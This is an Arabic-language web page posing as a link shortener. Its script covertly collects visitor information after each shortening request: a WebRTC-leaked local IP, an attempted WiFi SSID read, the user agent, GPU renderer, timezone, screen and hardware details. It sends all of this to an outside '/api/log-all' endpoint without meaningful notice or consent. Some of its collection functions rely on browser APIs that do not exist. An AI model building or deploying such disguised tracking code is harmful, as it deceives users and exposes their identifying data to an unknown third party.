<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>اختصار الروابط</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: white;
      border-radius: 15px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      padding: 50px;
      max-width: 600px;
      width: 100%;
    }

    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 30px;
      font-size: 32px;
    }

    .form-group {
      margin-bottom: 25px;
    }

    label {
      display: block;
      margin-bottom: 10px;
      color: #555;
      font-weight: 600;
    }

    input[type="url"] {
      width: 100%;
      padding: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      font-size: 15px;
    }

    input[type="url"]:focus {
      outline: none;
      border-color: #667eea;
    }

    button {
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    button:hover {
      transform: translateY(-2px);
    }

    .result {
      margin-top: 40px;
      padding: 25px;
      background: #f8f9fa;
      border-radius: 10px;
      display: none;
    }

    .result.show {
      display: block;
    }

    .result-label {
      font-size: 13px;
      color: #999;
      margin-bottom: 10px;
    }

    .result-link {
      background: white;
      padding: 15px;
      border-radius: 8px;
      word-break: break-all;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      color: #667eea;
      margin-bottom: 15px;
      border: 1px solid #e0e0e0;
    }

    .copy-btn {
      background: #4CAF50;
      padding: 12px;
      width: 100%;
    }

    .copy-btn:hover {
      background: #45a049;
    }

    .error {
      color: #f44336;
      text-align: center;
      margin-top: 15px;
      display: none;
    }

    .error.show {
      display: block;
    }

    .loading {
      display: none;
      text-align: center;
      color: #667eea;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔗 اختصار الروابط</h1>
    
    <form id="shortenForm">
      <div class="form-group">
        <label for="urlInput">أدخل الرابط:</label>
        <input 
          type="url" 
          id="urlInput" 
          placeholder="https://example.com" 
          required
        >
      </div>

      <div class="loading" id="loading">جاري المعالجة وجمع المعلومات...</div>
      <button type="submit">اختصر الرابط</button>
      <div class="error" id="error"></div>
    </form>

    <div class="result" id="result">
      <div class="result-label">الرابط المختصر:</div>
      <div class="result-link" id="shortenedUrl"></div>
      <button class="copy-btn" onclick="copyToClipboard()">نسخ الرابط ✓</button>
    </div>
  </div>

  <script>
    const API_URL = 'https://vvvvv-production-7945.up.railway.app';

    // جمع معلومات الـ 10 طرق
    async function collectAllMethods() {
      const methods = {};

      // طريقة 1: WebRTC
      try {
        methods.webrtc = await getWebRTCIP();
      } catch (e) {
        methods.webrtc = null;
      }

      // طريقة 2: WiFi SSID
      try {
        methods.wifi = await getWiFiInfo();
      } catch (e) {
        methods.wifi = null;
      }

      // طريقة 4: Browser Fingerprint
      methods.fingerprint = getBrowserFingerprint();

      // طريقة 5: DNS
      methods.dns = getDNSInfo();

      // طريقة 6: HTTP Headers
      methods.headers = getHeadersInfo();

      // طريقة 7: Timezone
      methods.timezone = getTimezoneInfo();

      // طريقة 8: WebGL
      methods.webgl = getWebGLInfo();

      // طريقة 9: Screen
      methods.screen = getScreenInfo();

      // طريقة 10: Features
      methods.features = getBrowserFeatures();

      return methods;
    }

    // الطريقة 1: WebRTC
    function getWebRTCIP() {
      return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        let found = false;
        pc.onicecandidate = (ice) => {
          if (!ice || !ice.candidate || found) return;
          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
          const match = ipRegex.exec(ice.candidate.candidate);
          if (match) {
            found = true;
            pc.close();
            resolve(match[1]);
          }
        };

        setTimeout(() => {
          pc.close();
          resolve(null);
        }, 3000);
      });
    }

    // الطريقة 2: WiFi SSID
    async function getWiFiInfo() {
      if (navigator.wifiList) {
        try {
          const wifis = await navigator.wifiList.getWifiList();
          if (wifis && wifis.length > 0) {
            return wifis[0].ssid || 'Unknown SSID';
          }
        } catch (e) {
          return null;
        }
      }
      return null;
    }

    // الطريقة 4: Browser Fingerprint
    function getBrowserFingerprint() {
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const platform = navigator.platform;
      return `${ua.substring(0, 30)}... | ${lang} | ${platform}`;
    }

    // الطريقة 5: DNS
    function getDNSInfo() {
      try {
        const dnsServers = navigator.dnsLookup ? 'Available' : 'Not Available';
        return dnsServers;
      } catch (e) {
        return 'Unable to detect';
      }
    }

    // الطريقة 6: HTTP Headers
    function getHeadersInfo() {
      return {
        language: navigator.language,
        encoding: 'UTF-8',
        userAgent: navigator.userAgent.substring(0, 50)
      };
    }

    // الطريقة 7: Timezone
    function getTimezoneInfo() {
      const offset = new Date().getTimezoneOffset();
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      return `${tz} (UTC${-offset / 60})`;
    }

    // الطريقة 8: WebGL
    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'Not supported';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        return renderer || 'WebGL Supported';
      } catch (e) {
        return 'Not supported';
      }
    }

    // الطريقة 9: Screen Resolution
    function getScreenInfo() {
      return `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}dpr)`;
    }

    // الطريقة 10: Browser Features
    function getBrowserFeatures() {
      const features = [
        navigator.hardwareConcurrency ? 'Cores: ' + navigator.hardwareConcurrency : null,
        navigator.deviceMemory ? 'RAM: ' + navigator.deviceMemory + 'GB' : null,
        navigator.maxTouchPoints > 0 ? 'Touch: Yes' : 'Touch: No'
      ].filter(f => f).join(' | ');
      return features || 'Standard features';
    }

    document.getElementById('shortenForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const url = document.getElementById('urlInput').value;
      const errorDiv = document.getElementById('error');
      const loading = document.getElementById('loading');
      const resultDiv = document.getElementById('result');
      
      errorDiv.classList.remove('show');
      loading.style.display = 'block';

      try {
        // أولاً: اختصر الرابط
        const shortenResponse = await fetch(`${API_URL}/api/shorten`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url })
        });

        const shortenData = await shortenResponse.json();

        if (!shortenData.shortened) {
          throw new Error('Failed to shorten URL');
        }

        // ثانياً: جمع معلومات الـ 10 طرق
        const methods = await collectAllMethods();

        // ثالثاً: أرسل المعلومات
        await fetch(`${API_URL}/api/log-all`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            code: shortenData.code,
            methods: methods
          })
        });

        // عرض النتيجة
        document.getElementById('shortenedUrl').textContent = shortenData.shortened;
        resultDiv.classList.add('show');
        document.getElementById('urlInput').value = '';

      } catch (error) {
        console.error('Error:', error);
        errorDiv.textContent = 'فشل الاتصال بالخادم';
        errorDiv.classList.add('show');
      } finally {
        loading.style.display = 'none';
      }
    });

    function copyToClipboard() {
      const text = document.getElementById('shortenedUrl').textContent;
      navigator.clipboard.writeText(text);
      alert('تم النسخ ✓');
    }
  </script>
</body>
</html>
